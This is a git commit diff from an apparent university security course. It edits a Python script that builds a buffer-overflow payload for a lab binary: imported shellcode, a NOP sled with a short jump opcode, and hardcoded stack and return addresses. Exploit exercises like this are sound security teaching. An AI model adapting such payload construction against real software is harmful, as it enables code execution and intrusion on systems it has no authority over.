a5850ada28af6946c048aaa3545526624d5a700e
Xuefeng-Zhu <xzhu15@illinois.edu>
2015-11-07 01:48:52 -0600

    finish 8

--- project4/4.2.8.py
+++ project4/4.2.8.py
@@ -1,13 +1,14 @@
 from shellcode import shellcode
 from struct import pack
 
-ebp = 0xbffef458
+ebp = 0xbffef45c
 buf = 0x080f3750
 
-padding = '\x90' * (40 - len(shellcode))
+jmp_op = '\xeb\x06' + '\x90' * 6
+padding = '\x90' * (40 - len(shellcode) - len(jmp_op))
 
 arg1 = shellcode 
-arg2 = shellcode + padding + pack("<I", ebp) + pack("<I", buf)
+arg2 = jmp_op + shellcode + padding + pack("<I", buf) + pack("<I", ebp)
 arg3 = shellcode
 
 print arg1, arg2, arg3
